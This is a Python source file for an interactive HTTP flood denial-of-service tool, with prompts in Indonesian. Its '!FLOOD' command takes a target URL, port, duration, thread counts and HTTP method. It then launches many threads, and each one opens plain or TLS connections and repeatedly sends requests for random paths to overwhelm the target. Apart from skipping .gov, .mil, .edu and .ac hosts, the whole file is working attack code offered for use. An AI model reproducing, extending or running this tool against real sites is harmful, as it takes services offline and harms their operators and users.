# IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import ssl
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

stop_attack = threading.Event()

def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

def generate_url_path(num):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(chars, k=int(num)))

def DoS_Attack(ip, host, port, type_attack, booter_sent, packet_type, is_https):
    if stop_attack.is_set():
        return
    url_path = generate_url_path(5)
    packet_data = f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()

    try:
        if is_https:
            context = ssl.create_default_context()
            raw_sock = socket.create_connection((ip, port), timeout=3)
            s = context.wrap_socket(raw_sock, server_hostname=host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))

        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)

    except:
        pass
    finally:
        try: s.close()
        except: pass

def run_attack(ip, host, port, end_time, spam, method, booter_sent, packet_type, is_https):
    while time.time() < end_time and not stop_attack.is_set():
        for _ in range(min(spam, 10)):
            if stop_attack.is_set():
                break
            t = threading.Thread(target=DoS_Attack, args=(ip, host, port, method, booter_sent, packet_type, is_https))
            t.start()
            t.join()

def countdown_timer(end_time):
    while not stop_attack.is_set():
        remaining = int(end_time - time.time())
        if remaining <= 0:
            break
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
    stop_attack.set()

def stop_attack_thread():
    input()
    stop_attack.set()
    print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")

def confirm_exit():
    while True:
        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
        sys.stdout.flush()
        choice = input().lower()
        if choice == 'y':
            print(f"\n{Fore.RED}Program terminated by user (Enter). Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

def command():
    global stop_attack
    while True:
        try:
            user_input = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not user_input:
                confirm_exit()
                continue
            args = user_input.strip().split(" ")
            if args[0].lower() == "clear":
                clear_text()
            elif args[0].upper() == "!FLOOD":
                if len(args) == 10:
                    packet_type = args[1].upper()
                    target_url = args[2]
                    port = int(args[3])
                    duration = int(args[4])
                    spam_thread = int(args[5])
                    create_thread = min(int(args[6]), 10)
                    booter_sent = int(args[7])
                    method = args[8].upper()
                    spam_create = min(int(args[9]), 10)

                    is_https = target_url.startswith("https://")
                    host = target_url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0]

                    if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
                        print(f"{Fore.GREEN}Uhh You Can't Attack This Website [{Fore.YELLOW}.gov .mil .edu .ac{Fore.WHITE}] . . .{Fore.RESET}")
                        continue

                    try:
                        ip = socket.gethostbyname(host)
                    except:
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    end_time = time.time() + duration

                    print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_url}\nPort: {port}\nType: {packet_type}\nHTTPS: {is_https}{Fore.RESET}")

                    for _ in range(create_thread):
                        for _ in range(spam_create):
                            t = threading.Thread(target=run_attack, args=(ip, host, port, end_time, spam_thread, method, booter_sent, packet_type, is_https))
                            t.start()

                    threading.Thread(target=countdown_timer, args=(end_time,)).start()
                    threading.Thread(target=stop_attack_thread).start()

                    while not stop_attack.is_set() and time.time() < end_time:
                        time.sleep(0.1)

                    stop_attack.set()
                    print()
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> <HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{user_input} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
